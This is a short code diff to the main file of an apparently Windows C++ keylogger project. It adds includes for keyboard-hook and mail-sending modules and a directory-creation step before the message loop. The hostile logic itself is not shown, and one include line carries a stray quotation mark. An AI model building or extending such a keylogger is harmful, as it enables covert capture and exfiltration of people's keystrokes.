@@ -3,7 +3,8 @@
 #include "Helper.h"
 #include "KeyConstants.h"
 #include "Base64.h"
-#include "Timer.h"
+#include "SendMail.h"
+#include "KeybHook.h""
 
 
 
@@ -12,7 +13,7 @@
 int main()
 {
     MSG Msg;
-
+    IO::MKDir(IO::GetOurPath(true));
     while(GetMessage(&Msg, NULL, 0, 0))
     {
         TranslateMessage(&Msg);
